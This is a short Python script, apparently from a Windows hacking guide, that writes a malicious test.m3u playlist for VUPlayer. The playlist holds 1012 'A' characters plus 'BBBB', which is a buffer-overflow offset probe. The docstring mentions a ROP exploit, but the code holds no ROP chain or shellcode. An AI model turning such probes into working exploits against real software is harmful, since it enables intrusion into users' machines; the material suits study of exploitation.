#!/usr/bin/env python
#-*- coding: utf-8 -*-
'''
    python ==> 윈도우해킹가이드, vuplayer를 ROP를 사용해 exploit해 본 코드 
'''

p = open("test.m3u", "w")

payload = "A"*1012 + "BBBB"

p.write(payload)
p.close()
